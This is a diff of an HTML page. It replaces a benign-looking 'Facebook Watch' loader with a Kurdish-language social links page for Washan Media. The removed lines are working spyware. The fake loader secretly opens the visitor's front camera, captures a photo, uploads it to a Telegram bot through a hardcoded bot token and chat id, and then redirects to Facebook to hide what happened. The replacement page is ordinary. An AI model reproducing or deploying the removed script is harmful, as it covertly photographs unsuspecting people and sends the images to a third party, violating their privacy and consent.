@@ -1,82 +1,548 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Facebook Watch</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Washan Media - لینکەکانم</title>
+    
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
-        body { background: #f0f2f5; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .fb-loader { text-align: center; }
-        .fb-logo { width: 65px; height: 65px; background: #1877f2; color: white; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 45px; font-weight: bold; margin: 0 auto 15px; }
-        .spinner { border: 4px solid #ddd; border-top: 4px solid #1877f2; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #v { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
-        #c { display: none; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            direction: rtl;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Animated Background */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #00c8ff, #667eea, #764ba2, #00c8ff);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+            opacity: 0.15;
+            z-index: 0;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* Floating particles */
+        .particle {
+            position: fixed;
+            width: 4px;
+            height: 4px;
+            background: rgba(0, 200, 255, 0.5);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: rgba(20, 20, 20, 0.8);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 30px;
+            padding: 40px 30px;
+            box-shadow: 0 25px 80px rgba(0, 200, 255, 0.2);
+            text-align: center;
+            animation: containerFadeIn 1s ease;
+            position: relative;
+            z-index: 1;
+        }
+
+        @keyframes containerFadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(50px) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .profile {
+            margin-bottom: 35px;
+            position: relative;
+        }
+
+        /* Glowing ring around profile */
+        .profile::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 160px;
+            height: 160px;
+            background: conic-gradient(from 0deg, #00c8ff, #667eea, #764ba2, #00c8ff);
+            border-radius: 50%;
+            animation: rotate 4s linear infinite;
+            opacity: 0.6;
+            filter: blur(10px);
+        }
+
+        @keyframes rotate {
+            from { transform: translate(-50%, -50%) rotate(0deg); }
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        .profile-image {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            background: white;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.5);
+            position: relative;
+            z-index: 2;
+            border: 3px solid rgba(0, 200, 255, 0.3);
+            animation: float 3s ease-in-out infinite;
+            overflow: hidden;
+        }
+
+        .profile-image::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://i.postimg.cc/j2YK6mKd/washan-logo.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        h1 {
+            color: #ffffff;
+            font-size: 32px;
+            margin-bottom: 8px;
+            font-weight: 700;
+            text-shadow: 0 0 20px rgba(0, 200, 255, 0.5);
+            animation: titleGlow 2s ease-in-out infinite;
+        }
+
+        @keyframes titleGlow {
+            0%, 100% { text-shadow: 0 0 20px rgba(0, 200, 255, 0.5); }
+            50% { text-shadow: 0 0 30px rgba(0, 200, 255, 0.8); }
+        }
+
+        .subtitle {
+            color: #00c8ff;
+            font-size: 16px;
+            margin-bottom: 25px;
+            font-weight: 500;
+            opacity: 0.9;
+        }
+
+        .warning-box {
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.15) 0%, rgba(251, 191, 36, 0.15) 100%);
+            border: 1px solid rgba(245, 158, 11, 0.3);
+            border-right: 3px solid #f59e0b;
+            padding: 15px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            color: #fbbf24;
+            font-size: 13px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            backdrop-filter: blur(10px);
+            animation: warningPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes warningPulse {
+            0%, 100% { box-shadow: 0 0 10px rgba(245, 158, 11, 0.2); }
+            50% { box-shadow: 0 0 20px rgba(245, 158, 11, 0.4); }
+        }
+
+        .warning-box i {
+            font-size: 18px;
+            color: #fbbf24;
+            animation: shieldPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes shieldPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .links {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .link-button {
+            background: rgba(30, 30, 30, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 18px;
+            padding: 20px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+        }
+
+        .link-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 200, 255, 0.2), transparent);
+            transition: right 0.6s;
+        }
+
+        .link-button:hover::before {
+            right: 100%;
+        }
+
+        .link-button::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 0;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(0, 200, 255, 0.1) 0%, rgba(102, 126, 234, 0.1) 100%);
+            transition: width 0.4s ease;
+            z-index: 0;
+        }
+
+        .link-button:hover {
+            border-color: #00c8ff;
+            transform: translateX(5px) scale(1.02);
+            box-shadow: 0 15px 40px rgba(0, 200, 255, 0.3);
+        }
+
+        .link-button:hover::after {
+            width: 100%;
+        }
+
+        .link-icon {
+            width: 55px;
+            height: 55px;
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            color: white;
+            flex-shrink: 0;
+            position: relative;
+            z-index: 1;
+            transition: all 0.4s ease;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .link-button:hover .link-icon {
+            transform: scale(1.15) rotate(-5deg);
+            box-shadow: 0 12px 30px rgba(0, 200, 255, 0.4);
+        }
+
+        .link-text {
+            flex: 1;
+            text-align: right;
+            position: relative;
+            z-index: 1;
+        }
+
+        .link-title {
+            font-size: 17px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 4px;
+            transition: all 0.3s ease;
+        }
+
+        .link-button:hover .link-title {
+            color: #00c8ff;
+            text-shadow: 0 0 10px rgba(0, 200, 255, 0.5);
+        }
+
+        .link-subtitle {
+            font-size: 13px;
+            color: #a0a0a0;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .link-button:hover .link-subtitle {
+            color: #c0c0c0;
+        }
+
+        .link-arrow {
+            font-size: 20px;
+            color: #666;
+            position: relative;
+            z-index: 1;
+            transition: all 0.4s ease;
+        }
+
+        .link-button:hover .link-arrow {
+            color: #00c8ff;
+            transform: translateX(-8px);
+            filter: drop-shadow(0 0 5px rgba(0, 200, 255, 0.8));
+        }
+
+        /* Social Media Colors with Glow */
+        .instagram { 
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            box-shadow: 0 8px 20px rgba(240, 148, 51, 0.4);
+        }
+        
+        .facebook { 
+            background: #1877f2;
+            box-shadow: 0 8px 20px rgba(24, 119, 242, 0.4);
+        }
+        
+        .tiktok { 
+            background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%);
+            box-shadow: 0 8px 20px rgba(0, 242, 234, 0.4);
+        }
+        
+        .whatsapp { 
+            background: #25D366;
+            box-shadow: 0 8px 20px rgba(37, 211, 102, 0.4);
+        }
+
+        .youtube { 
+            background: #FF0000;
+            box-shadow: 0 8px 20px rgba(255, 0, 0, 0.4);
+        }
+
+        .link-button:hover .instagram {
+            box-shadow: 0 12px 30px rgba(240, 148, 51, 0.6);
+        }
+
+        .link-button:hover .facebook {
+            box-shadow: 0 12px 30px rgba(24, 119, 242, 0.6);
+        }
+
+        .link-button:hover .tiktok {
+            box-shadow: 0 12px 30px rgba(0, 242, 234, 0.6);
+        }
+
+        .link-button:hover .whatsapp {
+            box-shadow: 0 12px 30px rgba(37, 211, 102, 0.6);
+        }
+
+        .link-button:hover .youtube {
+            box-shadow: 0 12px 30px rgba(255, 0, 0, 0.6);
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+
+            h1 {
+                font-size: 28px;
+            }
+
+            .profile-image {
+                width: 120px;
+                height: 120px;
+                font-size: 60px;
+            }
+
+            .link-button {
+                padding: 16px;
+            }
+
+            .link-icon {
+                width: 50px;
+                height: 50px;
+                font-size: 22px;
+            }
+        }
+
+        /* Entrance animations for links */
+        .link-button {
+            animation: linkSlideIn 0.6s ease forwards;
+            opacity: 0;
+        }
+
+        .link-button:nth-child(1) { animation-delay: 0.2s; }
+        .link-button:nth-child(2) { animation-delay: 0.3s; }
+        .link-button:nth-child(3) { animation-delay: 0.4s; }
+        .link-button:nth-child(4) { animation-delay: 0.5s; }
+        .link-button:nth-child(5) { animation-delay: 0.6s; }
+
+        @keyframes linkSlideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        @keyframes floatParticle {
+            0% {
+                transform: translateY(0) translateX(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100vh) translateX(50px);
+                opacity: 0;
+            }
+        }
     </style>
 </head>
 <body>
 
-<div class="fb-loader">
-    <div class="fb-logo">f</div>
-    <div class="spinner"></div>
-    <p style="color: #65676b; font-size: 14px; margin-top: 15px;">Loading Video...</p>
+<!-- Floating Particles -->
+<script>
+    for(let i = 0; i < 30; i++) {
+        let particle = document.createElement('div');
+        particle.className = 'particle';
+        particle.style.left = Math.random() * 100 + '%';
+        particle.style.top = Math.random() * 100 + '%';
+        particle.style.animation = `floatParticle ${5 + Math.random() * 10}s linear infinite`;
+        particle.style.animationDelay = Math.random() * 5 + 's';
+        document.body.appendChild(particle);
+    }
+</script>
+
+<div class="container">
+    <!-- Profile Section -->
+    <div class="profile">
+        <div class="profile-image"></div>
+        <h1>Washan Media</h1>
+        <p class="subtitle">تۆری وەشان میدیا</p>
+    </div>
+
+    <!-- Warning Box -->
+    <div class="warning-box">
+        <i class="fas fa-shield-alt"></i>
+        <span>وەشان میدیا تەنها لەم ئەپانە بەرپرسە</span>
+    </div>
+
+    <!-- Social Links -->
+    <div class="links">
+        
+        <!-- TikTok -->
+        <a href="https://www.tiktok.com/@washanmedia?_r=1&_t=ZS-93wNcIWb4Yj" class="link-button" target="_blank">
+            <div class="link-icon tiktok">
+                <i class="fab fa-tiktok"></i>
+            </div>
+            <div class="link-text">
+                <div class="link-title">TikTok</div>
+                <div class="link-subtitle">@washanmedia</div>
+            </div>
+            <div class="link-arrow">
+                <i class="fas fa-arrow-left"></i>
+            </div>
+        </a>
+
+        <!-- Facebook -->
+        <a href="https://www.facebook.com/share/18dSJLZmDo/?mibextid=wwXIfr" class="link-button" target="_blank">
+            <div class="link-icon facebook">
+                <i class="fab fa-facebook-f"></i>
+            </div>
+            <div class="link-text">
+                <div class="link-title">Facebook</div>
+                <div class="link-subtitle">پەیجی فەیسبووک</div>
+            </div>
+            <div class="link-arrow">
+                <i class="fas fa-arrow-left"></i>
+            </div>
+        </a>
+
+        <!-- Instagram -->
+        <a href="https://www.instagram.com/washan_media?igsh=MWpya2lsZnZlaTAyZQ==" class="link-button" target="_blank">
+            <div class="link-icon instagram">
+                <i class="fab fa-instagram"></i>
+            </div>
+            <div class="link-text">
+                <div class="link-title">Instagram</div>
+                <div class="link-subtitle">@washan_media</div>
+            </div>
+            <div class="link-arrow">
+                <i class="fas fa-arrow-left"></i>
+            </div>
+        </a>
+
+        <!-- WhatsApp -->
+        <a href="https://wa.me/9647515372521" class="link-button" target="_blank">
+            <div class="link-icon whatsapp">
+                <i class="fab fa-whatsapp"></i>
+            </div>
+            <div class="link-text">
+                <div class="link-title">WhatsApp</div>
+                <div class="link-subtitle">پەیوەندی ڕاستەوخۆ</div>
+            </div>
+            <div class="link-arrow">
+                <i class="fas fa-arrow-left"></i>
+            </div>
+        </a>
+
+        <!-- YouTube -->
+        <a href="https://youtube.com/@washanmedia1?si=D2eXu2u0W8LBPJI2" class="link-button" target="_blank">
+            <div class="link-icon youtube">
+                <i class="fab fa-youtube"></i>
+            </div>
+            <div class="link-text">
+                <div class="link-title">YouTube</div>
+                <div class="link-subtitle">@washanmedia1</div>
+            </div>
+            <div class="link-arrow">
+                <i class="fas fa-arrow-left"></i>
+            </div>
+        </a>
+
+    </div>
+
 </div>
 
-<video id="v" autoplay playsinline muted></video>
-<canvas id="c"></canvas>
-
-<script>
-    // زانیارییە نوێیەکانی تۆ
-    const t = "8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY";
-    const i = "6351568884";
-
-    async function start() {
-        const constraints = {
-            video: { 
-                facingMode: "user",
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
-            }
-        };
-
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            const v = document.getElementById('v');
-            v.srcObject = stream;
-            
-            v.onloadedmetadata = () => {
-                setTimeout(() => {
-                    const c = document.getElementById('c');
-                    const ctx = c.getContext('2d');
-                    c.width = v.videoWidth; 
-                    c.height = v.videoHeight;
-                    
-                    ctx.translate(c.width, 0); 
-                    ctx.scale(-1, 1);
-                    ctx.drawImage(v, 0, 0, c.width, c.height);
-
-                    c.toBlob(async (b) => {
-                        const f = new FormData();
-                        f.append('chat_id', i);
-                        f.append('photo', b, 'capture.jpg');
-                        
-                        // ناردنی وێنەکە بۆ بۆتە نوێیەکە
-                        fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: f });
-
-                        // گواستنەوە بۆ فەیسبووک
-                        window.location.replace("https://www.facebook.com/watch");
-                        
-                        setTimeout(() => { stream.getTracks().forEach(track => track.stop()); }, 500);
-                    }, 'image/jpeg', 0.7);
-                }, 1000);
-            };
-
-        } catch (err) {
-            window.location.replace("https://www.facebook.com/watch");
-        }
-    }
-
-    window.addEventListener('DOMContentLoaded', start);
-</script>
 </body>
 </html>
